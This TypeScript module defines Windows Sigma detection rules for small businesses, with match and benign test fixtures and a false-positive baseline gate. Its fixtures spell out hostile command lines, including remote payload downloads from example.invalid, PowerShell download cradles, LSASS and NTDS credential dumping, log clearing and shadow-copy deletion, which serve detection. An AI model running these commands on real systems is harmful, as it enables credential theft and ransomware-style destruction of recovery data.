import { attackTechniques, matches, parseSigma, runTests, type SigmaRule } from "@/lib/detections/sigma";

/**
 * SME / AU endpoint pack. Sigma rules for remote-access tools, ransomware LOLBins,
 * credential dumping, shadow-copy deletion, and mass renames.
 * A rule is enabled by default only when it matches nothing in BENIGN_BASELINE.
 */

export type SigmaCase = { name: string; event: Record<string, unknown>; expect: boolean };

type Level = "medium" | "high" | "critical";

const NOTEPAD = "C:\\Windows\\System32\\notepad.exe";

function detection(input: {
  n: number;
  title: string;
  description: string;
  level: Level;
  technique: string;
  tactic: string;
  category: string;
  fields: { key: string; values: string[] }[];
  hit: Record<string, string>;
  miss: Record<string, string>;
  fp: string;
}) {
  const body = input.fields
    .map((f) => `    ${f.key}:\n${f.values.map((v) => `      - '${v.replaceAll("'", "''")}'`).join("\n")}`)
    .join("\n");
  const yaml = `title: ${input.title}
id: b27a0001-4c1d-4f8b-9a2e-${input.n.toString(16).padStart(12, "0")}
status: stable
description: ${input.description}
author: Yuma IT blakSOC
logsource:
  product: windows
  category: ${input.category}
detection:
  selection:
${body}
  condition: selection
falsepositives:
  - ${input.fp}
level: ${input.level}
tags:
  - attack.${input.tactic}
  - attack.${input.technique.toLowerCase()}
`;
  return {
    yaml,
    cases: [
      { name: "matches", event: input.hit, expect: true },
      { name: "benign", event: input.miss, expect: false },
    ] satisfies SigmaCase[],
  };
}

function proc(p: {
  n: number;
  title: string;
  description: string;
  level: Level;
  technique: string;
  tactic: string;
  images: string[];
  all?: string[];
  any?: string[];
  hitCommand?: string;
  missCommand?: string;
  missImage?: string;
  fp: string;
}) {
  const fields = [{ key: "Image|endswith", values: p.images.map((img) => `\\${img}`) }];
  if (p.all) fields.push({ key: "CommandLine|contains|all", values: p.all });
  if (p.any) fields.push({ key: "CommandLine|contains", values: p.any });
  const hit: Record<string, string> = { Image: `C:\\Tools\\${p.images[0]}` };
  if (p.hitCommand) hit.CommandLine = p.hitCommand;
  const miss: Record<string, string> = { Image: p.missImage ?? NOTEPAD };
  if (p.missCommand) miss.CommandLine = p.missCommand;
  return detection({ ...p, category: "process_creation", fields, hit, miss });
}

function renamed(n: number, ext: string, family: string) {
  return detection({
    n,
    title: `${family} ransom file extension`,
    description: `A file renamed to the .${ext} extension used by ${family}.`,
    level: "critical",
    technique: "T1486",
    tactic: "impact",
    category: "file_event",
    fields: [{ key: "TargetFilename|endswith", values: [`.${ext}`] }],
    hit: { TargetFilename: `C:\\Users\\Public\\Documents\\budget.${ext}` },
    miss: { TargetFilename: "C:\\Users\\Public\\Documents\\budget.docx" },
    fp: "A document the organisation renamed on purpose",
  });
}

const VSS = "C:\\Windows\\System32\\vssadmin.exe";
const WMIC = "C:\\Windows\\System32\\wbem\\WMIC.exe";
const POWERSHELL = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
const MSIEXEC = "C:\\Windows\\System32\\msiexec.exe";
const RUNDLL = "C:\\Windows\\System32\\rundll32.exe";

export const SME_DETECTIONS: { yaml: string; cases: SigmaCase[] }[] = [
  proc({ n: 1, title: "AnyDesk remote access tool", description: "AnyDesk process started on an endpoint.", level: "high", technique: "T1219", tactic: "command_and_control", images: ["AnyDesk.exe"], fp: "Approved remote support session" }),
  proc({ n: 2, title: "AnyDesk installer", description: "Windows Installer launched with an AnyDesk package.", level: "high", technique: "T1219", tactic: "command_and_control", images: ["msiexec.exe"], any: ["anydesk"], hitCommand: "msiexec /i C:\\Users\\Public\\AnyDesk.msi", missImage: MSIEXEC, missCommand: "msiexec /i C:\\Users\\Public\\7zip.msi", fp: "Approved AnyDesk rollout" }),
  proc({ n: 3, title: "ScreenConnect client", description: "ConnectWise ScreenConnect client started.", level: "high", technique: "T1219", tactic: "command_and_control", images: ["ScreenConnect.Client.exe"], fp: "Approved ScreenConnect support session" }),
  proc({ n: 4, title: "ScreenConnect installer", description: "Windows Installer launched with a ScreenConnect package.", level: "high", technique: "T1219", tactic: "command_and_control", images: ["msiexec.exe"], any: ["screenconnect"], hitCommand: "msiexec /i C:\\Users\\Public\\ScreenConnect.msi", missImage: MSIEXEC, missCommand: "msiexec /i C:\\Users\\Public\\7zip.msi", fp: "Approved ScreenConnect rollout" }),
  proc({ n: 5, title: "TeamViewer remote access tool", description: "TeamViewer process started on an endpoint.", level: "high", technique: "T1219", tactic: "command_and_control", images: ["TeamViewer.exe"], fp: "Approved TeamViewer session" }),
  proc({ n: 6, title: "Splashtop streamer", description: "Splashtop streamer process started.", level: "high", technique: "T1219", tactic: "command_and_control", images: ["SplashtopStreamer.exe"], fp: "Approved Splashtop session" }),
  proc({ n: 7, title: "Atera agent", description: "Atera remote management agent started.", level: "high", technique: "T1219", tactic: "command_and_control", images: ["AteraAgent.exe"], fp: "Approved Atera agent" }),
  proc({ n: 8, title: "RustDesk remote access tool", description: "RustDesk process started on an endpoint.", level: "high", technique: "T1219", tactic: "command_and_control", images: ["rustdesk.exe"], fp: "Approved RustDesk session" }),
  proc({ n: 9, title: "NetSupport client", description: "NetSupport client32 started with NetSupport on the command line.", level: "high", technique: "T1219", tactic: "command_and_control", images: ["client32.exe"], any: ["NetSupport"], hitCommand: "client32.exe /NetSupport", missImage: "C:\\Tools\\client32.exe", missCommand: "client32.exe /install", fp: "Approved NetSupport deployment" }),
  proc({ n: 10, title: "Remote Utilities host", description: "Remote Utilities host service started.", level: "high", technique: "T1219", tactic: "command_and_control", images: ["rutserv.exe"], fp: "Approved Remote Utilities host" }),
  proc({ n: 11, title: "MeshAgent remote access tool", description: "MeshCentral MeshAgent started.", level: "high", technique: "T1219", tactic: "command_and_control", images: ["MeshAgent.exe"], fp: "Approved MeshAgent" }),
  proc({ n: 12, title: "Quick Assist", description: "Windows Quick Assist started.", level: "high", technique: "T1219", tactic: "command_and_control", images: ["QuickAssist.exe"], fp: "A person using Quick Assist with a vendor they invited" }),
  proc({ n: 13, title: "Certutil urlcache download", description: "Certutil used its urlcache to download a file.", level: "high", technique: "T1105", tactic: "command_and_control", images: ["certutil.exe"], any: ["urlcache"], hitCommand: "certutil -urlcache -split -f http://example.invalid/a.exe C:\\Users\\Public\\a.exe", missImage: "C:\\Windows\\System32\\certutil.exe", missCommand: "certutil -dump", fp: "An administrator caching a certificate URL" }),
  proc({ n: 14, title: "Bitsadmin transfer", description: "Bitsadmin created a transfer job.", level: "high", technique: "T1105", tactic: "command_and_control", images: ["bitsadmin.exe"], any: ["/transfer"], hitCommand: "bitsadmin /transfer job http://example.invalid/a.exe C:\\Users\\Public\\a.exe", missImage: "C:\\Windows\\System32\\bitsadmin.exe", missCommand: "bitsadmin /list /allusers /verbose", fp: "An administrator listing BITS jobs" }),
  proc({ n: 15, title: "Mshta remote application", description: "Mshta opened an HTTP application.", level: "high", technique: "T1218", tactic: "defense_evasion", images: ["mshta.exe"], any: ["http"], hitCommand: "mshta http://example.invalid/a.hta", missImage: "C:\\Windows\\System32\\mshta.exe", missCommand: "mshta vbscript:Close(1)", fp: "A local HTML application" }),
  proc({ n: 16, title: "Rundll32 javascript", description: "Rundll32 launched a javascript payload.", level: "high", technique: "T1218.011", tactic: "defense_evasion", images: ["rundll32.exe"], any: ["javascript:"], hitCommand: "rundll32.exe javascript:\"\\\\..\\\\mshtml,RunHTMLApplication\"", missImage: RUNDLL, missCommand: "rundll32.exe shell32.dll,Control_RunDLL", fp: "A signed installer that calls rundll32" }),
  proc({ n: 17, title: "Regsvr32 scriptlet", description: "Regsvr32 loaded scrobj.dll.", level: "high", technique: "T1218", tactic: "defense_evasion", images: ["regsvr32.exe"], any: ["scrobj.dll"], hitCommand: "regsvr32 /s /n /u /i:http://example.invalid/a.sct scrobj.dll", missImage: "C:\\Windows\\System32\\regsvr32.exe", missCommand: "regsvr32 /s C:\\Windows\\System32\\zipfldr.dll", fp: "Registration of a local component" }),
  proc({ n: 18, title: "WMI process call create", description: "WMIC created a process.", level: "high", technique: "T1047", tactic: "execution", images: ["WMIC.exe"], all: ["process", "call", "create"], hitCommand: "wmic process call create C:\\Tools\\updater.exe", missImage: WMIC, missCommand: "wmic process list brief", fp: "An inventory script listing processes" }),
  proc({ n: 19, title: "Scheduled task created", description: "Schtasks created a task.", level: "high", technique: "T1053.005", tactic: "execution", images: ["schtasks.exe"], any: ["/create"], hitCommand: "schtasks /create /tn Updater /tr C:\\Tools\\updater.exe /sc onlogon", missImage: "C:\\Windows\\System32\\schtasks.exe", missCommand: "schtasks /query /fo LIST", fp: "An administrator creating a maintenance task" }),
  proc({ n: 20, title: "Registry run key added", description: "reg.exe added a value under a Windows Run key.", level: "high", technique: "T1547.001", tactic: "persistence", images: ["reg.exe"], all: [" add ", "CurrentVersion\\Run"], hitCommand: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\Tools\\updater.exe", missImage: "C:\\Windows\\System32\\reg.exe", missCommand: "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", fp: "An installer adding an approved startup entry" }),
  proc({ n: 21, title: "PowerShell DownloadString", description: "PowerShell called DownloadString.", level: "high", technique: "T1059.001", tactic: "execution", images: ["powershell.exe", "pwsh.exe"], any: ["DownloadString"], hitCommand: "powershell.exe -nop -c IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')", missImage: POWERSHELL, missCommand: "powershell.exe Get-Process", fp: "An administrator downloading a signed script" }),
  proc({ n: 22, title: "Hidden encoded PowerShell", description: "PowerShell ran a hidden encoded command.", level: "high", technique: "T1059.001", tactic: "execution", images: ["powershell.exe", "pwsh.exe"], all: ["-enc", "-w hidden"], hitCommand: "powershell.exe -nop -w hidden -enc SQBFAFgA", missImage: POWERSHELL, missCommand: "powershell.exe -enc SQBFAFgA", fp: "A management agent that encodes a hidden command" }),
  proc({ n: 23, title: "Curl HTTP download", description: "Curl downloaded over HTTP.", level: "high", technique: "T1105", tactic: "command_and_control", images: ["curl.exe"], any: ["http"], hitCommand: "curl.exe http://example.invalid/a.exe -o C:\\Users\\Public\\a.exe", missImage: "C:\\Windows\\System32\\curl.exe", missCommand: "curl.exe --version", fp: "An administrator fetching a vendor file" }),
  proc({ n: 24, title: "Windows event log cleared", description: "Wevtutil cleared a log.", level: "high", technique: "T1070.001", tactic: "defense_evasion", images: ["wevtutil.exe"], all: [" cl "], hitCommand: "wevtutil cl Security", missImage: "C:\\Windows\\System32\\wevtutil.exe", missCommand: "wevtutil qe System", fp: "An administrator clearing a lab log" }),
  proc({ n: 25, title: "Procdump LSASS", description: "Procdump targeted lsass.", level: "critical", technique: "T1003.001", tactic: "credential_access", images: ["procdump.exe"], any: ["lsass"], hitCommand: "procdump.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp", missImage: "C:\\Tools\\procdump.exe", missCommand: "procdump.exe -accepteula notepad.exe", fp: "A support engineer dumping a hung application" }),
  proc({ n: 26, title: "Comsvcs LSASS minidump", description: "Rundll32 called comsvcs MiniDump.", level: "critical", technique: "T1003.001", tactic: "credential_access", images: ["rundll32.exe"], all: ["comsvcs.dll", "MiniDump"], hitCommand: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Users\\Public\\lsass.dmp full", missImage: RUNDLL, missCommand: "rundll32.exe shell32.dll,Control_RunDLL", fp: "A crash dump of a non-LSASS process that still names MiniDump" }),
  proc({ n: 27, title: "Mimikatz process", description: "Mimikatz executable started.", level: "critical", technique: "T1003.001", tactic: "credential_access", images: ["mimikatz.exe"], fp: "A lab copy of Mimikatz" }),
  proc({ n: 28, title: "Nanodump process", description: "Nanodump executable started.", level: "critical", technique: "T1003.001", tactic: "credential_access", images: ["nanodump.exe"], fp: "A lab copy of Nanodump" }),
  proc({ n: 29, title: "Ntdsutil IFM", description: "Ntdsutil created an IFM snapshot of NTDS.", level: "critical", technique: "T1003", tactic: "credential_access", images: ["ntdsutil.exe"], any: ["ifm"], hitCommand: "ntdsutil.exe \"ac i ntds\" ifm \"create full C:\\Users\\Public\\ntds\" q q", missImage: "C:\\Windows\\System32\\ntdsutil.exe", missCommand: "ntdsutil.exe", fp: "An administrator creating an approved IFM backup" }),
  proc({ n: 30, title: "PowerShell sekurlsa", description: "PowerShell invoked a sekurlsa command.", level: "critical", technique: "T1003.001", tactic: "credential_access", images: ["powershell.exe", "pwsh.exe"], any: ["sekurlsa"], hitCommand: "powershell.exe -c sekurlsa::logonpasswords", missImage: POWERSHELL, missCommand: "powershell.exe Get-Process", fp: "A lab script that mentions sekurlsa in a comment" }),
  proc({ n: 31, title: "Vssadmin delete shadows", description: "Vssadmin deleted volume shadow copies.", level: "critical", technique: "T1490", tactic: "impact", images: ["vssadmin.exe"], all: ["delete", "shadows"], hitCommand: "vssadmin delete shadows /all /quiet", missImage: VSS, missCommand: "vssadmin list shadows", fp: "An administrator deleting a shadow on purpose" }),
  proc({ n: 32, title: "WMIC shadowcopy delete", description: "WMIC deleted a shadow copy.", level: "critical", technique: "T1490", tactic: "impact", images: ["WMIC.exe"], all: ["shadowcopy", "delete"], hitCommand: "wmic shadowcopy delete", missImage: WMIC, missCommand: "wmic shadowcopy list", fp: "An administrator listing shadow copies" }),
  proc({ n: 33, title: "Wbadmin delete catalog", description: "Wbadmin deleted the backup catalog.", level: "critical", technique: "T1490", tactic: "impact", images: ["wbadmin.exe"], all: ["delete", "catalog"], hitCommand: "wbadmin delete catalog -quiet", missImage: "C:\\Windows\\System32\\wbadmin.exe", missCommand: "wbadmin get versions", fp: "An administrator rebuilding a backup catalog" }),
  proc({ n: 34, title: "Bcdedit recovery disabled", description: "Bcdedit turned recovery off.", level: "critical", technique: "T1490", tactic: "impact", images: ["bcdedit.exe"], all: ["recoveryenabled", "no"], hitCommand: "bcdedit /set {default} recoveryenabled no", missImage: "C:\\Windows\\System32\\bcdedit.exe", missCommand: "bcdedit /enum", fp: "An administrator changing boot recovery in a lab" }),
  proc({ n: 35, title: "Bcdedit ignore failures", description: "Bcdedit set bootstatuspolicy to ignoreallfailures.", level: "critical", technique: "T1490", tactic: "impact", images: ["bcdedit.exe"], any: ["ignoreallfailures"], hitCommand: "bcdedit /set {default} bootstatuspolicy ignoreallfailures", missImage: "C:\\Windows\\System32\\bcdedit.exe", missCommand: "bcdedit /enum", fp: "An administrator changing boot policy in a lab" }),
  proc({ n: 36, title: "Vssadmin resize shadow storage", description: "Vssadmin resized shadow storage.", level: "critical", technique: "T1490", tactic: "impact", images: ["vssadmin.exe"], all: ["resize", "shadowstorage"], hitCommand: "vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB", missImage: VSS, missCommand: "vssadmin list shadows", fp: "An administrator resizing shadow storage" }),
  renamed(37, "lockbit", "LockBit"),
  renamed(38, "akira", "Akira"),
  renamed(39, "rhysida", "Rhysida"),
  renamed(40, "blackcat", "BlackCat"),
  renamed(41, "encrypted", "encrypted-extension"),
  renamed(42, "locked", "locked-extension"),
];

/** Ordinary SME endpoint activity. Default-enable requires zero matches here. */
export const BENIGN_BASELINE: Record<string, unknown>[] = [
  { Image: NOTEPAD, CommandLine: "notepad.exe readme.txt" },
  { Image: "C:\\Windows\\explorer.exe", CommandLine: "explorer.exe" },
  { Image: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", CommandLine: "chrome.exe" },
  { Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", CommandLine: "OUTLOOK.EXE" },
  { Image: POWERSHELL, CommandLine: "powershell.exe Get-Process" },
  { Image: VSS, CommandLine: "vssadmin list shadows" },
  { Image: "C:\\Windows\\System32\\cmd.exe", CommandLine: "cmd.exe /c dir" },
  { Image: MSIEXEC, CommandLine: "msiexec /i C:\\Users\\Public\\7zip.msi" },
  { Image: "C:\\Windows\\System32\\wevtutil.exe", CommandLine: "wevtutil qe System" },
  { Image: "C:\\Windows\\System32\\certutil.exe", CommandLine: "certutil -dump" },
  { Image: "C:\\Windows\\System32\\bitsadmin.exe", CommandLine: "bitsadmin /list /allusers /verbose" },
  { Image: "C:\\Windows\\System32\\schtasks.exe", CommandLine: "schtasks /query /fo LIST" },
  { Image: "C:\\Windows\\System32\\reg.exe", CommandLine: "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" },
  { TargetFilename: "C:\\Users\\Public\\Documents\\budget.docx" },
  { Image: WMIC, CommandLine: "wmic process list brief" },
  { Image: "C:\\Windows\\System32\\wbadmin.exe", CommandLine: "wbadmin get versions" },
  { Image: "C:\\Windows\\System32\\bcdedit.exe", CommandLine: "bcdedit /enum" },
  { Image: "C:\\Windows\\System32\\curl.exe", CommandLine: "curl.exe --version" },
];

export function measureFalsePositives(items = SME_DETECTIONS, baseline = BENIGN_BASELINE) {
  let hits = 0;
  const perRule = items.map((item) => {
    const rule = parseSigma(item.yaml);
    const falsePositives = baseline.filter((event) => matches(rule, event)).length;
    hits += falsePositives;
    const rate = baseline.length ? falsePositives / baseline.length : 0;
    return { id: rule.id, title: rule.title, falsePositives, rate, enable: falsePositives === 0 };
  });
  const comparisons = items.length * baseline.length;
  return { perRule, hits, comparisons, rate: comparisons ? hits / comparisons : 0 };
}

export type SmeImportRow = {
  yaml: string;
  cases: SigmaCase[];
  sigmaId: string;
  title: string;
  description: string | null;
  status: string;
  severity: NonNullable<SigmaRule["level"]>;
  logsource: Record<string, string>;
  attackTechniques: string[];
  falsePositives: string[];
  confidence: number;
  enabled: boolean;
  tests: ReturnType<typeof runTests>;
};

/** Parsed pack, fixture results, and the baseline enable gate. Seed and tests share this. */
export function smeImportPlan(items = SME_DETECTIONS): SmeImportRow[] {
  const noise = measureFalsePositives(items);
  return items.map((item, i) => {
    const rule = parseSigma(item.yaml);
    const verdict = noise.perRule[i]!;
    return {
      yaml: item.yaml,
      cases: item.cases,
      sigmaId: rule.id,
      title: rule.title,
      description: rule.description ?? null,
      status: rule.status ?? "experimental",
      severity: rule.level ?? "medium",
      logsource: rule.logsource,
      attackTechniques: attackTechniques(rule),
      falsePositives: rule.falsepositives ?? [],
      confidence: rule.status === "stable" ? 75 : 50,
      enabled: verdict.enable,
      tests: runTests(rule, item.cases),
    };
  });
}
